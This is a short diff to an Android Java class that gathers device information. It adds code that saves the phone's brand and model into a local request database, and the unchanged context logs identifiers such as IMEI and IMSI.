@@ -2,6 +2,9 @@ package com.inet.android.info;
 
 import java.lang.reflect.Method;
 
+import com.inet.android.db.RequestDataBaseHelper;
+import com.inet.android.db.RequestWithDataBase;
+
 import android.content.Context;
 import android.content.SharedPreferences;
 import android.content.SharedPreferences.Editor;
@@ -19,7 +22,8 @@ public class GetInfo {
 	static TelephonyManager telephonyManager;
 	static int networkType;
 	TelephonyInfo telephonyInfo;
-
+	RequestDataBaseHelper db;
+	
 	public GetInfo(Context mContext) {
 		GetInfo.mContext = mContext;
 		Log.d("Getinfo", "context");
@@ -31,7 +35,13 @@ public class GetInfo {
 		telephonyManager = (TelephonyManager) mContext
 				.getSystemService(Context.TELEPHONY_SERVICE);
 		telephonyInfo = TelephonyInfo.getInstance(mContext);
+		db = new RequestDataBaseHelper(mContext);
 
+		// Вставляем контакты
+		Log.d("Insert: ", "Inserting ..");
+		db.addRequest(new RequestWithDataBase(getBrand()));
+		db.addRequest(new RequestWithDataBase(getModel()));
+		
 		Log.d("GetInfo", "	PhoneInfo:" + "\n" + getBrand() + "\n" + getModel()
 				+ "\n" + getIMEI() + "\n" + getIMSI() + "\n" + getSerialNum()
 				+ "\n" + getManufactured() + "\n" + getBrand() + "\n"
